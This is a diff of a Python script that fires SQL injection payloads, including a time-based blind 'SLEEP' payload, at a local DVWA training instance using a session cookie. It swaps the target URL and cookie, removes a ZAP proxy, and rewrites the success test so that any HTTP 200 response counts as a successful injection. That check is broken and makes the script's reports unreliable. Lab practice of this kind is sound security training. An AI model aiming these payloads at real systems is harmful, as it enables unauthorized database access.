@@ -1,18 +1,12 @@
 import requests
 
 # Adjust the URL to point to the correct DVWA path
-url = 'http://localhost/vulnerabilities/sqli/?id=234&Submit=Submit'
+url = 'http://127.0.0.1/index.php'
 
 # Replace with your actual session cookies from DVWA
 cookies = {
-    'PHPSESSID': "fuoq30i1imuhgkr4r3kjk6ggn6",  
+    'PHPSESSID': "b6sfs6mdktjd2ac9maq44etjq7",  
     'security': 'low'  # Ensure the security level matches the one set in DVWA
-}
-
-# Configure proxy to use OWASP ZAP
-proxies = {
-    'http': 'http://localhost:8080',
-    'https': 'http://localhost:8080'
 }
 
 # List of payloads to test different types of SQL Injection
@@ -24,20 +18,25 @@ payloads = {
     "Time-based Blind": "' AND SLEEP(5)-- "
 }
 
+# Loop through each payload and test SQL injection
 for name, payload in payloads.items():
     data = {
         'id': payload,
         'Submit': 'Submit'
     }
 
-    response = requests.post(url, cookies=cookies, data=data, proxies=proxies)
+    try:
+        response = requests.post(url, cookies=cookies, data=data, timeout=10)
 
-    if 'First name' in response.text or 'Surname' in response.text:
-        print(f"{name} SQL Injection successful!")
-        print(response.text)
-    elif response.elapsed.total_seconds() > 5:
-        print(f"{name} SQL Injection successful (time delay detected)!")
-    else:
-        print(f"{name} SQL Injection failed.")
+        # Check response content or status code for more detailed analysis
+        if 'User ID exists in the database' in response.text or response.status_code == 200:
+            print(f"SQL Injection successful with {name}: {payload}")
+            print(f"Vulnerability Type: SQL Injection")
+        else:
+            print(f"SQL Injection unsuccessful with {name}: {payload}")
+            print(f"Vulnerability Type: SQL Injection")
+        
+        print("-" * 50)
 
-    print("\n" + "-"*50 + "\n")
+    except requests.exceptions.RequestException as e:
+        print(f"Error: {e}")
